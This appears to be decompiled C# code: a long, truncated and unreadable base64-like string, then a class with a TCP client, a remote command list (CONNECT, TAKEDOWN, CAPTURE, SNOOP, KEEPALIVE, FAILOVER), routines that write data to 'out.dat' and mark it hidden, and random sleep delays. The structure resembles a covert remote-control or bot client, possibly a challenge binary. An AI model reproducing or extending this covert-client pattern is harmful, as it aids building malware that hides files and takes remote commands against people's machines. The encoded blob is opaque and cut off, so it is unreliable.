NOkR/KZio09/lkBO1eX6EAHd+hpWv/FsgbZbXQ5j2/wCixr2zJ95+3b1HXFdm6jnjimnNN4yK/wCXaO3+x6j+LESOEj8Sa1aavb214tzse9+zuJoUVQp27cMvG/DbiMkdK9D0OKBtUsjMcL9ojTr0UkE/+g1wc0KJ47MslvKyecgMruvloWtzgFSPvEoDnPGMY6V1t9dPY6fNdpjfb/vV9yBgfzp4yz5XFWuvxODDRqPC4iFSTlytpX7I9a+IdzBZ3GgPasSqahG5P0zXopHJHvXi95r1n4tm0WG0lEhkuUZdvJwf5cH9K9oPLZ6VxZen7N3Vnc+fna+g3FRsoqamNxXoElSRcjvVaVOtXnX61XkTPtQB5j8XLCZ9Nt7yI5VC8Eg9nHyn/wAdNeJ2urXjW09gscrSqxkTA+982ePfP8q+hficfK8N5/vXKD9GP9K8Y0dhFqt0QigCB36dSHPNWnoe7l8ZSp3v1Oavb57l2klZmZ+Tu+9n3q/4LliOtGRyMRxswyOrcY/xrIv7Rbi5lJLph2+ZfrWdPZ3Gno8kKzr5Y3GQ5H4g1MEj1cZOpGKVtD0q38SRz392WYIquFQeijA4+u0GoPEPiuPUdB03ToYdn2dXklcnJkkclmb9OK8+uo9TCxyJG/nbPmAPLejVIJL+0tFN9btFxlcnlhz/AIUST7nPTxEb3cdNzUsrxob+B1PO8Z/On6qgjv5wFITzGwMcdSQeeKwbXUfNvIvLVmw2eORitgM7sZGbLHqfWk/djY3w0vbVHJaI7z4M3B/t68t9+Ve03D5xjIdew/3jXttuo9K8H+F2orYeMbZXOVuka33HsTyP1UD8a99gU5FStTws4puGIv3SLsC4HeriVXgHGKtKKo8slQU8DFNXtTxQAo604U3NLQAo+lJn0ooPHP8AWgArG8XOI9EaQj/V3FucZxn98n69MD+lbORRn6gj6UJ2E0fOHiC9F54g1SbDESajMykDqoJqnDyx+6wbsSP89q2fGUEmreKNVkt7ybTktrh7dYrWKII23qxVkOSe5+tZumwukjxreo7Mu0GW3B2H12qUNejfQ8ipF8x0mhSnzGy7J1ODgZ9j/j710sIkaM7jl2GM7QDj8Mj0rJ0ewO9XluLRzt4zasrDqccS/T/vmuot7SxCIrKjjAX5Inycf9tDn8K4qktTtpRsjD1BiqvnAX+8OnTqR2rg9bk3mU5VQxxhWxu56/yr03VILVQ2wRLxhd6Mf/aled64kcwlbeqbev8Ao7k+v8UnXv8Ap1rahKzMMTF8tzI8Cqlx4utI8DAkUcdByK+i9H0VdIm1KYXD3D39212WcfMu4KAme6rjA9AR6V83eHNRGjeIrWeEFpA3zKAoBPbg5P0r6T07UorqzglkngEroGdQ4+8RzxmjF35kysvV4vuX+KQmmq6uMqyt34PWnfqB0rjPQsxQM96SkIPaigBaMCk59qTJ9qAFPNFFFABnFJkUlFABk9v1oNFBoASg8UUUAJx6Cig0n50AANJn14paQ89aQDS2KM040hoAr4x0pRRSimTYTjqKdSAAdBRnkVRRwvjd0bXER2iXybEEeY0Yxvds4354+UcgfVl43avw8iEegNIAP391M4wVxgNtH3QB0XsB+FU9eyNY1GQSlFjhgXiVlB5Zv4Zo+zHnPvwPmrR8BIo8PWxDbncFiM5IO48dc5Oc/wCFbO/s9PI5Y/xCbxbpRvbWK5jAE9u/XOMr3U/jg/nWZFYzFBuU5x1xT9W1621C/lsPtNl9jtwVdZJkPnv3G0nhR6ngkjsM1XFjoAbC2WjtgcbUiG76c9f09668O2oWZzV0nO6LA0+UfwMfwoFhKOdpz9KhFhoI/wCXDSThc8CIZP58duvr19Ua08PL96y0Q4Un5liG4jOOvTovX168HO3MjKxYNk+0gqRkdgcGuW8RtMqssKb0iXM65ZS6eikAkZXPzgEAjnHboY59Cgmjtre10VJZlOyWJYBIQcgCP5j84wDjDDrXM30+k6y5u559IsIBtGQ0SF3VwwADZZCrhxlSQ24EDkgJVNSZwujzjxbrawTi0hnC7RgBXAGcjL8cHOFOR1PJAPFcmq/aJPkYMx5J3fzPWvQJNM0Vme6luNOiE8rN5MVzGCPbCnlT2x0FWrPRtHZ1aCWwcqRh/PVjwfp3r0adenTieRUw86kzlfB7QjxJp7XoSeAyqHUKWXbn1Awfzr61GRwOwx/hj2rwWPwvoJuAoniWf7yxo5LP7hRz/OvV/Bd87aXDp85mMluPLjeVdplQdDg85A4ORzgHqTXlZhUjUakt0e3llKVJOD2OlApaj81VzlgCP0pwkVuhBx2zXm3R6w+jJPWm7vrRuPegCSimg5ozQAksqwIXkIAHP1rPbU5pDiCNVHvTdVfzJY4t3A5IzVvTLeN5QGXIx/SluBUF1qIPJjx/u1Zi1BgQlwFUngOp4q1qMKRlQgCgj1rKuYfNjKFaV7CRsg5Gc9aSqOk3RuIDHIR5sR2t6n0NW5ZoogDJIiBuF3MBk9/qatBcfRQMEDnrz7Gg/WkMKMfWj6GgHNAC4pKCfrSZoA8q+KemxWurx3MabDdwmRx2LKRk/iCPxzXgOoaz9m8WRtJb3P2fSJJzPKG8wiORjyRgbVBcAZzgFRnPX6P+L0X7vS7jt5kkZ49Qp/oa8jvtC0y+mM91Y280mApdk5OOmainUhTk+daM+joYerisLTVGSTi76+TM1vGNp5og+waqZPOW32m3CnzW+6vLDk+lVD48s2RXj0+9ZXR5FJ8tQQmd/wDHweD+XFaw8PaKuf8AiV2PPXMCn+lSLo2mJ9zTbJTnPFun+FZurhekX956SoZp1qxXyZ5p4pvo9aup7uKyVXMVvsZrhC65zgKqsQxOV45IwOBmvTtShM+j3XynhFZgR/tLT4bS2jdWjghjI7rGAalunzYXYPQxEn6Dn+lOpio1ZQjFaIzoZXUw8K1SpO7nq7I6T4BWdouu3ataQmSO0DxEgExkPgkZ6HDY4r3bn0rwL4H3Gzxi6buJbKVcE+jIf6Gvfq6JrW58tiYqM2kN/A00nPan9aaak5yJvpULj2NWGArM1PWLDSx/pl1HCT0B5P8ALikk3ohNpas5D4pqZNItLYMFZ7sNz3Co39WFeSQ2BhkmmVlkEsDRKVOfmc5/mwH1GOld38RfEllqskDWFysyW0LsoHGZD/8Asj8657wFp9nrNyunTXkeYkkuJlRslABtUHHKn5wRx1Wqm/ZwcpLRHt4HEU4UVqv1PM5WDSsQerE/rVW7sw0EzGKIE4w3mhiep4APfAz6V74/wf8ACSEsZZUxuzmc9hkn8O/pTf8AhUfg0MfNnDg4AUzMCCVyB9/nI5+leasxpI9GtmFGcbNHh6yibTLcr/rEjUEehH/6quarMl6qzI+7cigj05PH617Tb/DHwLAoCCJ9ygAfaHOcgkf8tO4yfpXk+vaLFYTSzWkTwQTL5gtn+ZrY5HyM2eec89a6KWIVW9rk4XEU5y5Fpoc6IFZCvlO/QhU4P8jUxiK7RsVDtHyq27bx6+tL5IY4dQy4xjpUyxj5VVUUKMBVrbW2x6NHlUnqgtLiWxu4LmFtssLrIpz3U8V9R6XdRahZW95Dgx3ESSr7BgG/TJFfMH2cngDJr3j4W6os3hO1tbiaOOe2d4NjsAxXO4HGc4wwH4U0pdjy89jBwjUTTaZ3kXFWFOarxY4HPP6irK4HX9KD5kkU4p4NMFPznoKdwF3Cl3Cm0Z9qYC7s1FdCZreQWrxRzFT5byoXQN7gEZ/MU7OAfbue1ZN/4w8O6W+y91zToHBwVedd35Ak/pRZjjCUvhuzNuP+E6RTtTR5T2MUzIW/B4z/AOhV5/rvj7WEuLjSbi3vbq9t38uSODyzED1I4lU98ZI7dK9S0rxbouuQXk2lX8V4tooeUoDhcgkHJ4x8p714Y0R1Jbu8xGZZptwdlBbJUN/7N1rejBSu5GdatKjo1d+Zky6nr1tLOY9D1HbKxZhLbNKwYnp8mP1qnFqOpRymabQ9UjO7ORYzjH5ofStO1tNbNzHD9qZYwcpySFGfX09q9D0ODXreEhmjm2g5A4Y4PH9a3n7nU5qeJjUetM5fT/HkUKIs+h6mNo5bypR/7SraX4n6MsQD6fqIYesEv/xuvT9JOopD89nazjoGVwD+Rp0zy5+fRlY9/ut/LNcvNF7o7PaRW0UeJX3xq8N+c6KzAZwE3MHDen3efp1rAv8Axlb6wWWz0TUrjnGRG559MhOa9C1L4VpqHjCHxHLptsTAxcxsFCn5T1BHOMjHrV/WP7VjUQRwqjqpGMfLuxkenGa29yLXKYOrdPmgeJtZatNMk40C/QBs8r5Y7f3iPeuy0vXrZPKjufC9oNqbXLPAkjADBO8SH89uc1X17T9dvYWAcqGJ+XJG3j+fGPwJ9K5FtJurDUUa5Z5AXDH5vvL1xXS6KmtWcP190naEEke/aZ4b1t1iubS00y1hkQbGfUriY7T32eWFz0712Ok2VzYW5S6vDdOTknbgJ7DJJ/M1w2neMJtH+F9xqkECy3ViTEscn3QcB8nHJVVYnj+7iuTT4+6jE4W5TQ9ynDBZTyfwY4rz5Qlue9hqFTFRvCx7kST3ory7RfjzoV24j1HyLbP8ccwKj8DzXbXXi/SYNNiv4bpL1LhhHbx237x53/uqB37+1Z8rvYzrUJ0fjRt5ozWTBca7dQ+Y2n2lmT92OW4LMPYhVYfkxqhF4mvdN1S203xDZw2pvH8u2u7eQvDJJ2Q5AKsecAjB7Z6ilHsYOVtzpqKQUtTcoQ0lKaWi4DaMUuO9Jj3pAJj3ooNJz6/pQAppCaQk+tBz7UAKTTTRSY96AAmkzS4pKAIM+oP4UoJ9DVIXc2eFH/fP/wBepBcXB/h/8d/+vS5kFizu9P1psj7AD1OcCq7XEw6nHH3cVn6h4l0zTbhIdT1G0tZShkjSVwpbr0zweh45NNO+kUTOSgrs828beJJ7zxFqdhYXTRxQNCtzJG7ISyYJG/zo9q/NjqBketHwx0lbIz6jcvGgvJVkg2nBIWMKd3/AlbA+p9BXnXgnW/t3iuTzpGZ7+5MpYp0ZjywY52ckfMOQOhr13T7G20+/XT/Mmjj3CVYnBCFTzkbxuGWz1ODuyPU+vKkoR9l3R49Oq5S9p5noJfTREWlW2bA5DKCT+GM1WiOgXLFVsLRyRyTaD/4miKyYW/mog8sDkjtU8bWKxguzyuy/dHAB+tciwtt5XO51ddhRZ6KOljYjH/Tuv/xNUtY1DSdMhCw21n57/cXyAT3ydvBPGcBefanXEvlkkrtHf2rz7V/FwgluI5Iwss8SyHeUfEXOMqeCgUnIwGJ5+lrCXejMp11FbHS223U7l7W5YQ20KmOVJCQSGGGhJ+UsGwrhucdOg525b+2muFh+0ujDjauCO3J71yWn6bqE1lGZh5MBXKqn3R7Dk8AdPSrMOnQ2s6BppokLAP5bbWK56A4498c+hFEsMlq3chYh20Vje1GBdMybhFAJ++XABrJm1uzhIMcsOOxEoNdl9itPsccfkJIqgFHcbzjHTceSfesHW7OAwNmGMkDI+UcVyqtFO1jodKVrpnPv4ptmOxJYZD3RX3H8uufwqPSPFtlq2tDQre9j/tDPMbBg6r1JKkDDAc49gehrHn1cW85j8wKAfujpWV8KtO0iD4pT3M41FdSdrm5WQqPJeJ8j5cc5G8KcjqD611KEXFtroc6qS50k+p7pNaGGPLKfmA5PJP1rjfHHiK98MaWuoWLxB0nQOJBwy88foPwyetdpr+v2en2HnSR3jqxA/c2ksjZ+iqT+leR/EPxJZ6voN5Zw2OsNK5VlEmnTKMhw3dB2Brgp0pOasjvlVjHc9M8L+JLfxRosGpW6sofKyIT/AKtx95f8K1/zryH4BXs66PqdkYpIhDOrBZEdCAQR/Eo9K9X8+UDkL+Z/wrSvH2c3EqnJTSkivqmtW+leVHKJpbibPlW9uheSTHUgAcD1J4Hcis7TptW1q3a+ivxags8f2N4B+5ZW24Zs7t3U+nTr1pLnT9RGtPqNhfRQfaIkhlSW2MpAXOChDDBOeRz0rRsIv7OtjBEWLEtK8kg5d25Zjjpz+grPmSQ9b6mMLS4uZ4YmlDLEcvIAfnIOf6VrWOtQpexQIrEychj0Yeo/wrOsbqKJpFZxkO2fzNLp9hpsWpLeJJJuHVT93r61UfMH5G5rusW9gqSXG9VJ28KTg/lXOHxYrahLZixlbyyN7q4IAz16fQ/pVTxFY3V7rcbrdxx2fmb3BHzbf7vPepLKXRdKcqURFAUCQgkuT13duwqrK2quRd37Il1KGeG/WS0t5I3lb/XRzsCx+hG3H406bT7tNTGp6/YR6nH5ZiiWGPzRbKCW3eWRyzZALLnG33rTkeK4h82F1cLhgVOQR+FacVwzxK2BkjvUczSLcTI8JC8SzvBNHdJam8kNktyD5ggIUgHPP3t+M87cVu5PpUYnkPZPzpfMf2FS5XY1GysOJI6CjLZxR5hH8NV7/VrXS4DcXs0NvFkLvkbAOQTj+dPmRSi5OyLIJb1oJc4OK5S5+J+gwv5cEkt1JnACROox9WUCqX/C1beWEPDYyfOAysWU8EZ9RUymlub08HWn8Mb/AID/AItRM3huGcqf3NyrE9gCrAn+VeVLZ3dzam+t7WeS1VdxnjjZowO/zAYrvb/x5PeRujeftcbduQoP1ArnrnVtQubaW1S6kit5FK+UhOzB6g/3qylKnLdnvYBYrDw5YwucQ/iLSUODqdqGzjAkBobxBpgiEzXLeWTgP5MhH4ELj9av2nhaC1beqW7n3hP/AMVWoLaAR7X0/T5D/fZJR/7UxWL9lfQ9uNau1eyuck3jHQ4+t434Qv8A/E1r6HND4udrDTXzJcI8KmX92udjdS2D0z2pLzwlZ3wJkjVP+uSY/mTU+jeF7PRbmK6tjMWifeqvJ8m7aR0GM8MRzVwlRWrucuJq4yS5YWaZ6h8N/hzo3gnF9PqNrd6oUKF0mGyMHqF5yfqQM+gwa746lZqMtdQjjOd4P5+lePR+J9SiG2NLYAdhF19+tYnjHxlf2+mT[...string is too long...]";
			try
			{
				if (File.Exists("out.dat"))
				{
					File.SetAttributes("out.dat", FileAttributes.Normal);
					File.Delete("out.dat");
				}
				TextWriter textWriter = new StreamWriter("out.dat");
				textWriter.WriteLine(value);
				textWriter.Flush();
				textWriter.Close();
				File.SetAttributes("out.dat", FileAttributes.Hidden); // writes 'value' variable to out.dat
			}
			catch (IOException)
			{
			}
		}

		// Token: 0x0600000B RID: 11 RVA: 0x000027F0 File Offset: 0x000009F0
		public void method_5(string string_2, string string_3)
		{
			try
			{
				if (File.Exists(string_2))
				{
					File.SetAttributes(string_2, FileAttributes.Normal);
					File.Delete(string_2);
				}
				TextWriter textWriter = new StreamWriter(string_2);
				textWriter.WriteLine(string_3);
				textWriter.Flush();
				textWriter.Close();
				File.SetAttributes(string_2, FileAttributes.Hidden);
			}
			catch (IOException)
			{
			}
		}

		// Token: 0x0600000C RID: 12 RVA: 0x00002854 File Offset: 0x00000A54
		public void method_6(int int_0, int int_1)
		{
			Random random = new Random();
			int num = random.Next(int_0, int_1);
			Thread.Sleep(num * 1000);
		}

		// Token: 0x04000001 RID: 1
		private TcpClient tcpClient_0;

		// Token: 0x04000002 RID: 2
		private StreamReader streamReader_0;

		// Token: 0x04000003 RID: 3
		private StreamWriter streamWriter_0;

		// Token: 0x04000004 RID: 4
		private bool bool_0;

		// Token: 0x04000005 RID: 5
		private string[] string_0 = new string[]
		{
			"HELLO",
			"TEST",
			"FAILOVER",
			"CONNECT",
			"TAKEDOWN",
			"CAPTURE",
			"KEEPALIVE",
			"LOOK",
			"CODE",
			"GENERATE",
			"GET",
			"SNOOP",
			"LOOP",
			"GOODBYE"
		};

		// Token: 0x04000006 RID: 6
		private string[] string_1 = new string[]
		{
			"HINT"
		};

		// Token: 0x04000007 RID: 7
		private bool bool_1 = false;

		// Token: 0x04000008 RID: 8
		private static readonly Random random_0 = new Random();

		// Token: 0x04000009 RID: 9
		private static readonly object object_0 = new object();
	}
}
